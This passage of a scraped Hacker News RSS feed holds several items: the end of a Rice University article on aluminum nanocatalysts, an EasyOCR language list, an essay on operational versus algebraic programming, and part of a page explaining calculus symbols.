href="https://t.umblr.com/redirect?z=http%3A%2F%2Fnordlander.rice.edu%2Fmembers%2Fnordlander&amp;t=MmM2MThiMGU1YWE4ODYwMDdiM2EyN2E5Y2M1NjRmMTVlZDZmMTFmMCxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">Peter Nordlander</a>, verified the results of the catalytic experiments by developing a theoretical model of the hot electron energy transfer process between the light-activated aluminum nanoparticles and hydrogen molecules.</p><p>“We input the wavelength of light and particle shape,” Lou said. “Using these two aspects, we can accurately predict which shape will produce the best catalyst.”</p><p>The work is part of an ongoing <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.epa.gov%2Fgreenchemistry%2Fbasics-green-chemistry%23twelve&amp;t=NjI0NDQ0YjIxNmYzYWIwYWIyODgxZmQ4YTU5MThiOTg4ZTI4OWZjMSxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">green chemistry</a> effort by LANP to develop commercially viable light-activated nanocatalysts that can insert energy into chemical reactions with <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmagazine.rice.edu%2F2018%2F02%2Fwe-dont-know%2F&amp;t=MmNhZGFlMTA1NzA5ZGYwMTQ2MjcxYWUyNDJlZDhiODk2NWI0MmNmNCxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">surgical precision</a>. LANP has previously demonstrated catalysts for <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fnews.rice.edu%2F2016%2F07%2F18%2Frices-antenna-reactor-catalysts-offer-best-of-both-worlds%2F&amp;t=ODMyZmM5Y2IyZWI0ZDY3NmQwNzJjZmYyOTQ3NTBhZTRhMDc4NDQwZCxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">ethylene</a> and <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fnews.rice.edu%2F2020%2F01%2F10%2Fgasification-goes-green%2F&amp;t=YWExNmI0YzBiMzMzYTI2NTMxOWIxNWNjOTg3YjNlOTE1ZWE4NDBjNyxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">syngas</a> production, the <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fnews.rice.edu%2F2018%2F10%2F04%2Flight-makes-rice-u-catalyst-more-effective-2%2F&amp;t=MzhjMDI2OTYwODNmYTcyY2I3NDZlNmFmYWU1YTMyMmY2MDVhYjFkNyxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">splitting of ammonia</a> to produce hydrogen fuel and for <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fnews.rice.edu%2F2020%2F06%2F22%2Ffluorocarbon-bonds-are-no-match-for-light-powered-nanocatalyst-2%2F&amp;t=ZGQ2MDBkOWE5NGFkMjNmOTNlMjg2OGI5ZTQ1NzU2ZGY2YmE0NWRiMyxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">breaking apart “forever chemicals.”</a></p><p>“This study shows that photocatalyst shape is another design element engineers can use to create photocatalysts with the higher reaction rates and lower activation barriers,” said Halas, Rice’s &nbsp;Stanley C. Moore Professor of Electrical and Computer Engineering, director of Rice’s <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fsci.rice.edu%2F&amp;t=Zjc4ZjIwNzRiMDI2YjEyMDM0YTgzNGI2M2NiYTQ5MjhhNzE5Yjc5OCxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">Smalley-Curl Institute</a> and a professor of chemistry, bioengineering, physics and astronomy, and materials science and nanoengineering.</p><p>–</p><p><i>Header image: A study of aluminum nanocatalysts by Rice University’s Laboratory for Nanophotonics found that octopods (left), six-sided particles with sharply pointed corners, had a reaction rate five times higher than nanocubes (center) and 10 times higher than 14-sided nanocrystals. Credit:&nbsp;<a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fnews.rice.edu%2F2020%2F09%2F18%2Fshape-matters-for-light-activated-nanocatalysts-2%2F&amp;t=M2UwZTgzNTgzZmM5Y2FiMzVmY2M4NTI4ZWQzNTMzMzQ4OWQxZjk4NCxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">Lin Yuan/Rice University</a>.</i></p><p><b>Source: <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fnews.rice.edu%2F2020%2F09%2F18%2Fshape-matters-for-light-activated-nanocatalysts-2%2F&amp;t=M2UwZTgzNTgzZmM5Y2FiMzVmY2M4NTI4ZWQzNTMzMzQ4OWQxZjk4NCxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">Rice University</a></b></p><p><b>Full study:</b>&nbsp;“Morphology-Dependent Reactivity of a Plasmonic Photocatalyst”, <i>ACS Nano</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1021%2Facsnano.0c05383&amp;t=ZDc3Zjk2ZDNjNWViMDVkODY0ZjhiNjNhZDY3MTc5ZjgzN2M2ZDg0MixUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">https://doi.org/10.1021/acsnano.0c05383</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/619930090543955968/smallest-semiconductor-laser">Researchers conceive smallest semiconductor laser</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/materials">materials</a>
                                    
                                        <a href="https://nuadox.com/tagged/physics">physics</a>
                                    
                                        <a href="https://nuadox.com/tagged/nanotechnology">nanotechnology</a>
                                    
                                        <a href="https://nuadox.com/tagged/optics">optics</a>
                                    
                                    </p>
                                </span></p>
                                
                            </div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/629803542619799552/octopods-nanocatalysts</link>
            <guid isPermaLink="false">hacker-news-small-sites-24536394</guid>
            <pubDate>Sun, 20 Sep 2020 18:59:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[EasyOCR]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24536346">thread link</a>) | @jonbaer
<br/>
September 20, 2020 | https://www.jaided.ai/easyocr | <a href="https://web.archive.org/web/*/https://www.jaided.ai/easyocr">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

                    <div>

                        <article>

                            <div>
															
															

															<p>
																	EasyOCR is a python module for extracting text from image. It is a general OCR that can read both natural scene text and dense text in document.
																	We are currently supporting 70+ languages and expanding.
																</p>

															  <h3>Supported Languages</h3>
															    <table>
																			 <tbody><tr><th>Language</th><th>Code Name</th></tr>
																			 <tr><td>Abaza</td><td>abq</td></tr>
																			 <tr><td>Adyghe</td><td>ady</td></tr>
																			 <tr><td>Afrikaans</td><td>af</td></tr>
																			 <tr><td>Angika</td><td>ang</td></tr>
																			 <tr><td>Arabic</td><td>ar</td></tr>
																			 <tr><td>Assamese</td><td>as</td></tr>
																			 <tr><td>Avar</td><td>ava</td></tr>
																			 <tr><td>Azerbaijani</td><td>az</td></tr>
																			 <tr><td>Belarusian</td><td>be</td></tr>
																			 <tr><td>Bulgarian</td><td>bg</td></tr>
																			 <tr><td>Bihari</td><td>bh</td></tr>
																			 <tr><td>Bhojpuri</td><td>bho</td></tr>
																			 <tr><td>Bengali</td><td>bn</td></tr>
																			 <tr><td>Bosnian</td><td>bs</td></tr>
																			 <tr><td>Simplified Chinese</td><td>ch_sim</td></tr>
																			 <tr><td>Traditional Chinese</td><td>ch_tra</td></tr>
																			 <tr><td>Chechen</td><td>che</td></tr>
																			 <tr><td>Czech</td><td>cs</td></tr>
																			 <tr><td>Welsh</td><td>cy</td></tr>
																			 <tr><td>Danish</td><td>da</td></tr>
																			 <tr><td>Dargwa</td><td>dar</td></tr>
																			 <tr><td>German</td><td>de</td></tr>
																			 <tr><td>English</td><td>en</td></tr>
																			 <tr><td>Spanish</td><td>es</td></tr>
																			 <tr><td>Estonian</td><td>et</td></tr>
																			 <tr><td>Persian (Farsi)</td><td>fa</td></tr>
																			 <tr><td>French</td><td>fr</td></tr>
																			 <tr><td>Irish</td><td>ga</td></tr>
																			 <tr><td>Goan Konkani</td><td>gom</td></tr>
																			 <tr><td>Hindi</td><td>hi</td></tr>
																			 <tr><td>Croatian</td><td>hr</td></tr>
																			 <tr><td>Hungarian</td><td>hu</td></tr>
																			 <tr><td>Indonesian</td><td>id</td></tr>
																			 <tr><td>Ingush</td><td>inh</td></tr>
																			 <tr><td>Icelandic</td><td>is</td></tr>
																			 <tr><td>Italian</td><td>it</td></tr>
																			 <tr><td>Japanese</td><td>ja</td></tr>
																			 <tr><td>Kabardian</td><td>kbd</td></tr>
																			 <tr><td>Korean</td><td>ko</td></tr>
																			 <tr><td>Kurdish</td><td>ku</td></tr>
																			 <tr><td>Latin</td><td>la</td></tr>
																			 <tr><td>Lak</td><td>lbe</td></tr>
																			 <tr><td>Lezghian</td><td>lez</td></tr>
																			 <tr><td>Lithuanian</td><td>lt</td></tr>
																			 <tr><td>Latvian</td><td>lv</td></tr>
																			 <tr><td>Magahi</td><td>mah</td></tr>
																			 <tr><td>Maithili</td><td>mai</td></tr>
																			 <tr><td>Maori</td><td>mi</td></tr>
																			 <tr><td>Mongolian</td><td>mn</td></tr>
																			 <tr><td>Marathi</td><td>mr</td></tr>
																			 <tr><td>Malay</td><td>ms</td></tr>
																			 <tr><td>Maltese</td><td>mt</td></tr>
																			 <tr><td>Nepali</td><td>ne</td></tr>
																			 <tr><td>Newari</td><td>new</td></tr>
																			 <tr><td>Dutch</td><td>nl</td></tr>
																			 <tr><td>Norwegian</td><td>no</td></tr>
																			 <tr><td>Occitan</td><td>oc</td></tr>
																			 <tr><td>Polish</td><td>pl</td></tr>
																			 <tr><td>Portuguese</td><td>pt</td></tr>
																			 <tr><td>Romanian</td><td>ro</td></tr>
																			 <tr><td>Russian</td><td>ru</td></tr>
																			 <tr><td>Serbian (cyrillic)</td><td>rs_cyrillic</td></tr>
																			 <tr><td>Serbian (latin)</td><td>rs_latin</td></tr>
																			 <tr><td>Nagpuri</td><td>sck</td></tr>
																			 <tr><td>Slovak (need revisit)</td><td>sk</td></tr>
																			 <tr><td>Slovenian</td><td>sl</td></tr>
																			 <tr><td>Albanian</td><td>sq</td></tr>
																			 <tr><td>Swedish</td><td>sv</td></tr>
																			 <tr><td>Swahili</td><td>sw</td></tr>
																			 <tr><td>Tamil</td><td>ta</td></tr>
																			 <tr><td>Tabassaran</td><td>tab</td></tr>
																			 <tr><td>Thai</td><td>th</td></tr>
																			 <tr><td>Tagalog</td><td>tl</td></tr>
																			 <tr><td>Turkish</td><td>tr</td></tr>
																			 <tr><td>Uyghur</td><td>ug</td></tr>
																			 <tr><td>Ukranian</td><td>uk</td></tr>
																			 <tr><td>Urdu</td><td>ur</td></tr>
																			 <tr><td>Uzbek</td><td>uz</td></tr>
																			 <tr><td>Vietnamese (need revisit)</td><td>vi</td></tr>
																			</tbody></table>
																	
															  
															
                            </div>
                        </article>


                    </div>
                </div></div>]]>
            </description>
            <link>https://www.jaided.ai/easyocr</link>
            <guid isPermaLink="false">hacker-news-small-sites-24536346</guid>
            <pubDate>Sun, 20 Sep 2020 18:54:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sixty second stories of exceptional founders every 10 days]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24536331">thread link</a>) | @evla
<br/>
September 20, 2020 | http://tareksway.com/visionaries | <a href="https://web.archive.org/web/*/http://tareksway.com/visionaries">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://tareksway.com/visionaries</link>
            <guid isPermaLink="false">hacker-news-small-sites-24536331</guid>
            <pubDate>Sun, 20 Sep 2020 18:52:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[In the computer]]>
            </title>
            <description>
<![CDATA[
Score 45 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24535977">thread link</a>) | @todsacerdoti
<br/>
September 20, 2020 | https://chris-martin.org/2020/in-the-computer | <a href="https://web.archive.org/web/*/https://chris-martin.org/2020/in-the-computer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>When people talk about "algebraic reasoning", explanations fall flat because we neglect to first figure out kind of reasoning we're contrasting it against. When we write computer code using an operational model, we do <i>think about</i> what we write — so what manner of reasoning are we using? Can we give it a name? And can we explain why it seems so incompatible with the sort of reasoning that Lambda Man is always going on about?</p><p>I propose that the culture of programming at present may be divided into two approaches, explained by the following competing conceptions of the act of programming:</p><ol><li>An operational programmer <i>goes into</i> the computer;</li><li>An algebraic programmer remains <i>outside</i> the computer.</li></ol><p>We all have some need to shift between the two perspectives, but many of us become more entrenched in one or the other.</p><h2>Who calls the calls</h2><p>To start piecing together the orientation of each kind of programmer with respect to the computer, I'd like to look at a curious question of agency regarding function calls.</p><ul><li>When I write the expression "f x", I may describe my act of programming by saying that "we <b>apply</b> the function <i>f</i> to an argument <i>x</i>".</li><li>When the machine executes the program, I expect that "it will <b>evaluate</b> the function <i>f</i> at the argument <i>x</i>".</li></ul><p>But this separation between my action as an author and the machine's action as an automaton is only so distinct in the parlance of an algebraic programmer. If I were a Python programmer:</p><ul><li>When I write the expression "f(x)", I am "calling the function <i>f</i>".</li><li>When the machine executes my program, I expect that the Python interpreter will "call the function <i>f</i>".</li></ul><p>So who calls the function: me or Python? The answer is both; I <i>am</i> Python, and its actions are my actions, regardless of whether I am present and typing into a REPL or whether I have scripted them out ahead of time in a program that may run in my absence.</p><h2>One with the machine</h2><p>In either variety of programming, we sometimes put ourselves in the shoes of the machine to reason about the anticipated outcome of what we write. But how this imagination works depends on a great deal on whether we are outside or in. When we trace an operational program flow, the text of the program forms a space we can move within, and each variable is a statue that comes alive and begins to talk. Algebraic expression evaluation is a much more sterile and dull affair, and we remain seated in our desk chair. <i>Evaluating</i> is rewriting an expression in another form; it does not take us into different headspace from the one in which we wrote the code in the first place.</p><h2>Removing the lime from the coconut</h2><p>When an experienced inside-the-computer author begins in a programming language that forces us to approach programs from the outside, we can expect the question: If "I have an <code>IO String</code>", then "how do I get to the <code>String</code>"?</p><p>While others have already addressed this question in detail, what I want to draw attention to here is that the misunderstanding originates from trying to apply the <i>inside</i> conceptual mapping to a programming model that is strongly <i>outside</i>. An <code>IO String</code> is a process that produces a <code>String</code> result. So if I <i>were</i> standing inside a Haskell program, holding such a thing in my hands, it stands to reason that I could run the process and get the string. But we do not <i>have</i> such values because we do not <i>go</i> inside to <i>get</i> anything. We remain at the text editor, writing definitions. One such definition might be for a process which consists of the machine 1. first running some <code>IO String</code> process; and then 2. doing some other action with the resulting string.</p><p>This is not an unfamiliar task for a JavaScript programmer, who knows that one cannot get the value from a Promise — all we can do is set up plans for what to do once the Promise is fulfilled. A JavaScript programmer, although inside of the computer, is outside of the event loop. When my callbacks are roused, I do my work, then I fall back sleep to await another gig.</p><h2>What you got in that room</h2><p>The term "global variable" reveals something interesting about our mental picture. Such a variable does not span the globe, nor even a local network. To what scope does a word so grand as "global" refer? Humbly, the scope of a process. Or perhaps an entire machine, if I am a kernel developer. When I code operationally, I reside in a tiny world — the landmasses on my little blue marble are the memory segments to which I have access.</p><p>When I switched from operational to algebraic programming, first I learned that there are no global variables, then that terminology began to fade from consciousness altogether. As a Haskell programmer, I'm not in a little globe on the desk; I live on the Earth and I type definitions. Among those definitions may be a datatype that represents the state of a process, true. But this datatype is not my world, and the vast majority definitions I write in service of the program will not be functions of it.</p><p>Private "member variables" in a Java class can only be accessed <i>from within</i> the class. Perhaps the preposition can be taken to refer somewhat literally to the lexical scope of the class definition — that is, the code that is written between the opening and closing braces. But do we employ a deeper container metaphor here? Maybe this one is just me, but I see the <i>instance</i> as a <i>room</i>, and the members as the stuff I have at my disposal when I'm working inside that room.</p><p>In Haskell we also have lexical scoping, as well as a notion of modules with definitions that are either exported or not exported, which for many purposes mirrors the public/private field distinction. But I do not have the experience of mentally going inside a module in the same sense as reasoning inside of a Java instance. I believe it is Java's coupling of modules with mutable state that encourages this spacial reasoning.</p><h2>Getting your steps in</h2><p>When you use a step debugger, you actually <i>step into</i> the program! This is true regardless of whether you are using the debugging facilities of Python or Haskell. Though the code may be algebraic, when we use a step debugger we are always looking at it from an operational perspective.</p><h2>Working on documents</h2><p>Lately I like to refer to my role as "author" more than "programmer" — regardless of whether the file extension is ".md" or ".hs". It's because I don't feel like I work inside a computer anymore. I work sitting <i>at</i> a computer, I write <i>about</i> programs, and — although much of what I write can be executed by a machine — I do not often become lost within, because I remain safely on the outside.</p></div></div></div>]]>
            </description>
            <link>https://chris-martin.org/2020/in-the-computer</link>
            <guid isPermaLink="false">hacker-news-small-sites-24535977</guid>
            <pubDate>Sun, 20 Sep 2020 18:18:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Calculus and Analysis Symbols Explained]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24535853">thread link</a>) | @R3G1R
<br/>
September 20, 2020 | https://mathvault.ca/hub/higher-math/math-symbols/calculus-analysis-symbols/ | <a href="https://web.archive.org/web/*/https://mathvault.ca/hub/higher-math/math-symbols/calculus-analysis-symbols/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div id="theme-content-section"><div><section data-css="tve-u-16ec5d248bb"><p><span>I</span>n mathematics, <strong>calculus</strong> formalizes the study of continuous change, while <strong>analysis</strong> provides it with a rigorous foundation in <a href="https://mathvault.ca/hub/higher-math/math-symbols/logic-symbols/" target="_blank" aria-label="logic (opens in a new tab)" rel="noreferrer noopener">logic</a>. The following list documents some of the most notable symbols and notations in calculus and analysis, along with each symbol’s usage and meaning.</p><p>For readability purpose, these symbols are categorized by <strong>topic</strong> and <strong>function</strong> into tables. Other comprehensive lists of <a href="https://mathvault.ca/hub/higher-math/math-symbols/" target="_blank" aria-label="math symbols (opens in a new tab)" rel="noreferrer noopener">math symbols</a> — as categorized by subject&nbsp;and type — can be also found in the relevant pages below (or in the navigational panel).</p><div><div><div><figure><img loading="lazy" width="400" height="518" src="https://mathvault.ca/wp-content/uploads/Math-Symbols-eBook-Cover.png" alt="Cover of Math Vault's Comprehensive List of Mathematical Symbols eBook" title="Math Symbols eBook Cover"></figure><div><p>Prefer the PDF version instead?</p><p>Get the master summary of mathematical symbols in <strong>eBook form</strong> — along with each symbol’s usage and LaTeX code.</p></div></div></div></div><h2><span id="Constants_and_Variables"></span>Constants and Variables<span></span></h2><p>In calculus and analysis, constants and variables are often reserved for <strong>key mathematical numbers</strong> and <strong>arbitrarily small quantities</strong>. The following table documents some of the most notable symbols in these categories — along with each symbol’s example and meaning.</p><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$e$</td><td><strong><a aria-label="Euler's number (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/E_(mathematical_constant)" target="_blank">Euler’s number e</a></strong></td><td>$\displaystyle e = \frac{1}{0!} + \frac{1}{1!} + \cdots$</td></tr><tr><td>$\pi$<br>(<a href="https://mathvault.ca/hub/higher-math/math-symbols/greek-hebrew-latin-symbols/#Greek_Symbols" target="_blank" aria-label="Pi (opens in a new tab)" rel="noreferrer noopener">Pi</a>)</td><td><strong><a href="https://en.wikipedia.org/wiki/Pi" target="_blank" aria-label="Archimedes' constant (opens in a new tab)" rel="noreferrer noopener">Archimedes’ constant</a></strong></td><td>$\dfrac{\pi^2}{6} = \dfrac{1}{1^2} + \dfrac{1}{2^2} +$<br>$\dfrac{1}{3^2} + \dfrac{1}{4^2} + \cdots$</td></tr><tr><td>$i$</td><td><strong><a href="https://en.wikipedia.org/wiki/Imaginary_unit" target="_blank" aria-label="Imaginary unit (opens in a new tab)" rel="noreferrer noopener">Imaginary unit</a></strong></td><td>$e^{\pi i} = \cos \pi + i \sin \pi$</td></tr><tr><td>$\gamma$<br>(<a href="https://mathvault.ca/hub/higher-math/math-symbols/greek-hebrew-latin-symbols/#Greek_Symbols" target="_blank" aria-label="Gamma (opens in a new tab)" rel="noreferrer noopener">Gamma</a>)</td><td><strong><a href="https://en.wikipedia.org/wiki/Euler%E2%80%93Mascheroni_constant" target="_blank" aria-label="Euler–Mascheroni constant (opens in a new tab)" rel="noreferrer noopener">Euler–Mascheroni constant</a></strong></td><td>$\displaystyle \left( \sum_{k=1}^{n} \dfrac{1}{k}-\ln n \right) \to$<br>$\gamma \approx 0.577$</td></tr><tr><td>$\Omega$<br>(<a href="https://mathvault.ca/hub/higher-math/math-symbols/greek-hebrew-latin-symbols/#Greek_Symbols" target="_blank" aria-label="Capital omega (opens in a new tab)" rel="noreferrer noopener">Capital omega</a>)</td><td><strong><a href="https://en.wikipedia.org/wiki/Omega_constant" target="_blank" aria-label="Omega constant (opens in a new tab)" rel="noreferrer noopener">Omega constant</a></strong></td><td>$\Omega e^{\Omega} = 1$</td></tr><tr><td>$m$</td><td>Variable for <strong><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Slope" target="_blank">slope</a></strong></td><td>$m = \dfrac{y_2-y_1}{x_2-x_1}$</td></tr><tr><td>$h$, $\Delta x$, $\delta x$</td><td><strong><a aria-label="Limiting variables (opens in a new tab)" href="https://en.wikipedia.org/wiki/List_of_limits#Limits_involving_derivatives_or_infinitesimal_changes" target="_blank" rel="noreferrer noopener">Limiting variables</a></strong> for <a href="https://en.wikipedia.org/wiki/Difference_quotient" target="_blank" aria-label="difference quotient (opens in a new tab)" rel="noreferrer noopener">difference quotient</a></td><td>$\displaystyle \lim_{h \to 0} \dfrac{f(x+h)-f(x)}{h}$</td></tr><tr><td>$L$</td><td>Variable for <strong><a aria-label="limiting value (opens in a new tab)" href="https://en.wikipedia.org/wiki/Limit_(mathematics)" target="_blank" rel="noreferrer noopener">limit</a></strong></td><td>If $f(x) \to L$, then $f(x)^2 \to L^2$.</td></tr><tr><td>$\varepsilon$ (<a aria-label="Epsilon (opens in a new tab)" href="https://mathvault.ca/hub/higher-math/math-symbols/greek-hebrew-latin-symbols/#Greek_Symbols" target="_blank" rel="noreferrer noopener">Epsilon</a>),<br>$\delta$ (<a aria-label="Delta (opens in a new tab)" href="https://mathvault.ca/hub/higher-math/math-symbols/greek-hebrew-latin-symbols/#Greek_Symbols" target="_blank" rel="noreferrer noopener">Delta</a>)</td><td>Variables for <strong><a href="https://en.wikipedia.org/wiki/(%CE%B5,_%CE%B4)-definition_of_limit" target="_blank" aria-label="arbitrarily small quantities (opens in a new tab)" rel="noreferrer noopener">arbitrarily small quantities</a></strong></td><td>$\forall \varepsilon \, \exists \delta \, \big( 0&lt;|x-x_0|&lt;\delta$ $\implies |f(x)-L|&lt; \varepsilon \big) $</td></tr><tr><td>$a, b$</td><td>Variables for <strong>endpoints</strong> in <a aria-label=" (opens in a new tab)" rel="noreferrer noopener" href="https://mathvault.ca/hub/higher-math/math-symbols/common-math-symbols/#Intervals" target="_blank">intervals</a> and <a href="#Univariate_Integralrelated_Symbols" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener">definite integrals</a></td><td>$\displaystyle \int_a^b 2x \, \mathrm{d}x= b^2-a^2$</td></tr><tr><td>$C$</td><td><strong><a href="https://en.wikipedia.org/wiki/Constant_of_integration" target="_blank" aria-label="Constant of integration (opens in a new tab)" rel="noreferrer noopener">Constant of integration</a></strong></td><td>$\displaystyle \int \dfrac{1}{x} \, \mathrm{d} x = \ln |x| + C$</td></tr></tbody></table></figure><h2><span id="Sequence,_Series_and_Limit"></span>Sequence, Series and Limit<span></span></h2><p>The concepts of <strong><a href="https://en.wikipedia.org/wiki/Sequence" target="_blank" rel="noopener noreferrer">sequence</a></strong>, <strong><a href="https://en.wikipedia.org/wiki/Series_(mathematics)" target="_blank" rel="noopener noreferrer">series</a></strong> and <strong><a href="https://en.wikipedia.org/wiki/Limit_(mathematics)" target="_blank" rel="noopener noreferrer">limit</a></strong> form the foundation of calculus (and by extension real and complex analysis). The following table features some of the most common symbols related to these topics — along with each symbol’s usage and meaning.</p><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$+\infty$</td><td><strong><a href="https://en.wikipedia.org/wiki/Infinity#Real_analysis" target="_blank" aria-label="Positive infinity (opens in a new tab)" rel="noreferrer noopener">Positive infinity</a></strong></td><td>$\dfrac{1}{1} + \dfrac{1}{2} + \cdots = \infty$</td></tr><tr><td>$-\infty$</td><td><strong><a href="https://en.wikipedia.org/wiki/Infinity#Real_analysis" target="_blank" aria-label="Negative infinity (opens in a new tab)" rel="noreferrer noopener">Negative infinity</a></strong></td><td>As $x \to -\infty$, $e^x \to 0$.</td></tr><tr><td>$(a_n), (b_n), (c_n)$</td><td><strong><a aria-label="Sequence (opens in a new tab)" href="https://en.wikipedia.org/wiki/Sequence" target="_blank" rel="noreferrer noopener">Sequences</a></strong></td><td>$\displaystyle (a_n)_{n=0}^\infty =$<br>$(a_0, a_1, a_2, \ldots)$</td></tr><tr><td>$\displaystyle \sum_{n = i}^k a_n$</td><td><strong><a href="https://en.wikipedia.org/wiki/Series_(mathematics)" target="_blank" aria-label="Series (opens in a new tab)" rel="noreferrer noopener">Series</a></strong></td><td>$\displaystyle \sum_{n=1}^k b_n = \\ b_1 + \cdots + b_k$</td></tr><tr><td>$\| \mathrm{x}-\mathrm{y}\|$</td><td><strong><a href="https://en.wikipedia.org/wiki/Euclidean_distance" target="_blank" aria-label="Euclidean distance (opens in a new tab)" rel="noreferrer noopener">Euclidean distance</a></strong> between points $\mathrm{x}$ and $\mathrm{y}$</td><td>$\| \mathrm{x}-\mathrm{x}_0 \| &lt; 1 \implies$<br>$| f(\mathrm{x})-f(\mathrm{x}_0) | &lt; 2 $</td></tr><tr><td>$d(x, y)$</td><td><strong><a aria-label="Metric (opens in a new tab)" href="https://en.wikipedia.org/wiki/Metric_(mathematics)" target="_blank" rel="noreferrer noopener">Distance function</a></strong></td><td>$d(x, y) = |x-y|$</td></tr><tr><td>$\displaystyle \lim_{n \to \infty} a_n$</td><td><strong><a href="https://en.wikipedia.org/wiki/Limit_of_a_sequence" target="_blank" aria-label="Limit of sequence (opens in a new tab)" rel="noreferrer noopener">Limit of sequence</a></strong></td><td>$\displaystyle \lim_{n \to \infty} \left(1+\dfrac{1}{n}\right)^n = e$</td></tr><tr><td>$\displaystyle \lim_{k \to \infty} \sum_{n=i}^k a_n, \sum_{n=i}^{\infty} a_n$</td><td><strong><a href="https://en.wikipedia.org/wiki/Series_(mathematics)" target="_blank" aria-label="Limit of series (opens in a new tab)" rel="noreferrer noopener">Limit of series</a></strong></td><td>$\displaystyle \sum_{n=0}^{\infty} \dfrac{1}{2^n} = 2$</td></tr><tr><td>$\mathrm{x} \to a$</td><td>Variable $\mathrm{x}$ <strong><a href="https://en.wikipedia.org/wiki/Limit_(mathematics)" target="_blank" aria-label="tends to (opens in a new tab)" rel="noreferrer noopener">tends to</a></strong> $a$</td><td>$\lim (a_n) = 1/4$ as $n \to \infty$.</td></tr><tr><td>$f(x) \to L$</td><td>Function $f(x)$ <strong><a href="https://en.wikipedia.org/wiki/Limit_(mathematics)" target="_blank" aria-label="tends to (opens in a new tab)" rel="noreferrer noopener">tends to</a></strong> limit $L$</td><td>Since $g(x)$ is continuous at $c$, $g(x) \to g(c)$ as $x \to c$.</td></tr><tr><td>$\displaystyle \lim_{x \to a} f(x)$</td><td><strong><a aria-label="Limit of function (opens in a new tab)" href="https://en.wikipedia.org/wiki/Limit_of_a_function" target="_blank" rel="noreferrer noopener">Limit of function</a></strong> $f(x)$ as $x$ tends to $a$</td><td>$\displaystyle \lim_{x \to 0} \dfrac{\sin x}{x} = 1$</td></tr><tr><td>$\displaystyle \lim_{x \to a^+} f(x)$, 